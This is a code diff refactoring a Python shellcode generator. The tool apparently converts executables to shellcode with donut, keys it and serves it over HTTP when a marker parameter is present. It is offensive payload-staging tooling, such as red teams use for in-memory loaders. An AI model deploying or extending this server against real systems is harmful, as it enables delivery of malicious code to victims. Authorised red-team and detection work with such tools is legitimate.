@@ -56,8 +56,7 @@ class ShellcodeGenerator:
                 except TypeError:
                     print("WARNING: It was not possible to set entropy due to an outdated donut-shellcode pip, runtime parameters have been disabled.")
                     print("Compile the python module from the github repo to fix this issue.")
-                    shellcode = donut.create(
-                        inputfile)
+                    shellcode = donut.create(inputfile)
             else:
                 try:
                     shellcode = donut.create(
@@ -84,59 +83,60 @@ class ShellcodeGenerator:
             keycode = str(ShellcodeGenerator.KEYCOMP['NONE'])
         return b"LOLZ" + keycode.encode('UTF8') + b'\r\n' + binascii.hexlify(keyed_shellcode) + b'\r\n'
 
-class ShellcodeHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
-    MARKER_PARAM = 'shcgen'
-    generator = None
+class ShellcodeHTTPServer:
+    class ShellcodeHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
+        MARKER_PARAM = 'shcgen'
+        generator:ShellcodeGenerator = None
+        tempdir = None
+        protocol_version = 'HTTP/1.0'
 
-    def __init__(self, *args, **kwargs):
+        # Hijack shellcode requests
+        def translate_path(self, path: str) -> str:
+            # Check if it has the marker parameter
+            original_path = path
+            path = super().translate_path(path)
+            if '?' in original_path and original_path.split('#', 1)[0].split('?')[1] == self.MARKER_PARAM:
+                # it's a shellcode request
+                print(f"Detected shellcode request for {os.path.basename(path)}")
+                if os.path.isfile(path + '.exe'):
+                    path = path + '.exe'
+                if os.path.isfile(path):
+                    try:
+                        shellcodefile = os.path.join(self.tempdir.name, os.path.basename(path))
+                        if not os.path.exists(shellcodefile):
+                            print(f"Generating shellcode...")
+                            with open(shellcodefile, 'wb') as f:
+                                f.write(self.generator.generate_shellcode(path))
+                        print(f"Returning hijacked path {shellcodefile}")
+                        return shellcodefile
+                    except Exception:
+                        print("Shellcode generation failed!")
+                        traceback.print_exc()
+
+            return path
+    
+    def __init__(self, generator):
+        self.generator = generator
         self.tempdir = tempfile.TemporaryDirectory()
-        super().__init__(*args, **kwargs)
+        self.ShellcodeHTTPRequestHandler.generator = generator
+        self.ShellcodeHTTPRequestHandler.tempdir = self.tempdir
 
     def __del__(self):
         del self.tempdir
 
-    # Hijack shellcode requests
-    def translate_path(self, path: str) -> str:
-        # Check if it has the marker parameter
-        original_path = path
-        path = super().translate_path(path)
-        if '?' in original_path and original_path.split('#', 1)[0].split('?')[1] == self.MARKER_PARAM:
-            # it's a shellcode request
-            print(f"Detected shellcode request for {os.path.basename(path)}")
-            if os.path.isfile(path + '.exe'):
-                path = path + '.exe'
-            if os.path.isfile(path):
-                try:
-                    shellcodefile = os.path.join(self.tempdir.name, os.path.basename(path))
-                    if not os.path.exists(shellcodefile):
-                        print(f"Generating shellcode...")
-                        with open(shellcodefile, 'wb') as f:
-                            f.write(self.generator.generate_shellcode(path))
-                    print(f"Returning hijacked path {shellcodefile}")
-                    return shellcodefile
-                except Exception:
-                    print("Shellcode generation failed!")
-                    traceback.print_exc()
-
-        return path
-
-    @staticmethod
-    def serve(generator, bind, port, directory):
+    def serve(self, bind, port, directory):
         class DualStackServer(http.server.ThreadingHTTPServer):
             def server_bind(self):
                 # suppress exception when protocol is IPv4
                 with contextlib.suppress(Exception):
-                    self.socket.setsockopt(
-                        socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
+                    self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
                 return super().server_bind()
             def finish_request(self, request, client_address):
                 self.RequestHandlerClass(request, client_address, self,
                                             directory=directory)
 
-        ShellcodeHTTPRequestHandler.generator = generator
         DualStackServer.address_family, addr = http.server._get_best_family(bind, port)
-        ShellcodeHTTPRequestHandler.protocol_version = 'HTTP/1.0'
-        with DualStackServer(addr, ShellcodeHTTPRequestHandler) as httpd:
+        with DualStackServer(addr, self.ShellcodeHTTPRequestHandler) as httpd:
             host, port = httpd.socket.getsockname()[:2]
             url_host = f'[{host}]' if ':' in host else host
             print(
@@ -147,7 +147,6 @@ class ShellcodeHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 httpd.serve_forever()
             except KeyboardInterrupt:
                 print("\nKeyboard interrupt received, exiting.")
-                sys.exit(0)
 
 def usage():
     print("Usage: " + sys.argv[0] + " [OPTIONS] <input.exe|-S [connection string]>")
@@ -250,4 +249,6 @@ if __name__ == "__main__":
             f.write(shellcode)
         print("Output written to " + outfile)
     elif http_server:
-        ShellcodeHTTPRequestHandler.serve(generator=generator, port=http_port, bind=http_ip, directory=os.getcwd())
+        server = ShellcodeHTTPServer(generator)
+        server.serve(port=http_port, bind=http_ip, directory=os.getcwd())
+        del server
